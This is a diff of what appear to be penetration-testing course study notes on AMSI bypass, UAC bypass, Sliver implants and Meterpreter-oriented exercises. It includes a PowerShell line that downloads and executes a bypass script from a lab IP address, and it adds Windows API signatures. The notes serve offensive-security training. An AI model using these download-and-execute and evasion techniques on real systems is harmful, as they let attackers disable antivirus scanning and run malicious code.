@@ -773,16 +773,17 @@ $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
 ```powershell
  iex (New-Object Net.WebClient).DownloadString('http://192.168.45.176:8000/07AMSIBypass.ps1')
 ```
-### TODO: Try doing AMSI bypass in C#
-
-### TODO 7.4.2 Q2 
-- cannot get wmi to work on homelab instance
 
 #### 7.4.2 Extra Mile
 
 Create a similar AMSI bypass but instead of modifying the code of _AmsiOpenSession_, find a suitable instruction to change in _AmsiScanBuffer_ and implement it from reflective PowerShell.
 - https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
 - https://github.com/rogdooley/OSEP-Code-And-Notes/blob/main/Windows/Powershell/ASBB.ps1
+
+### 7.5.2
+
+- used sliver to start an implant on the Student instance
+- forked a UAC Bypass implementation on github and added an Amsi Bypass class to it (https://github.com/rogdooley/SharpBypassUAC)
 
 
 #### 7.6.2 Is That Your Registry Key
@@ -879,3 +880,25 @@ catch(e)
 
 1. Recreate the AMSI bypass by renaming wscript.exe to "amsi.dll" and executing it.
 2. Instead of a regular shellcode runner, implement this bypass with a process injection or hollowing technique and obtain a Meterpreter shell that stays alive after the detection.
+
+#### NtQueryInformationProcess
+```cpp
+__kernel_entry NTSTATUS NtQueryInformationProcess(
+  [in]            HANDLE           ProcessHandle,
+  [in]            PROCESSINFOCLASS ProcessInformationClass,
+  [out]           PVOID            ProcessInformation,
+  [in]            ULONG            ProcessInformationLength,
+  [out, optional] PULONG           ReturnLength
+);
+```
+
+#### ZwQueryInformationProcess
+```cpp
+NTSTATUS WINAPI ZwQueryInformationProcess(
+  _In_      HANDLE           ProcessHandle,
+  _In_      PROCESSINFOCLASS ProcessInformationClass,
+  _Out_     PVOID            ProcessInformation,
+  _In_      ULONG            ProcessInformationLength,
+  _Out_opt_ PULONG           ReturnLength
+);
+```
